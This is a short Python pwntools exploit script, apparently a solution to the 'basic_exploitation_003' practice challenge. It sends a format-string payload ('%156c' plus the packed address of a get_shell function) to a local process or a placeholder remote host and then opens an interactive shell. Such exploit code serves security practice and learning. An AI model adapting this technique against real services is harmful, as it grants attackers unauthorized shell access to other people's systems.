#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic_exploitation_003_patched")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main")
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()
    get_shell = 0x8048669

    payload = b'%156c' + p32 (get_shell)
    p.send (payload)
    p.interactive()


if __name__ == "__main__":
    main()
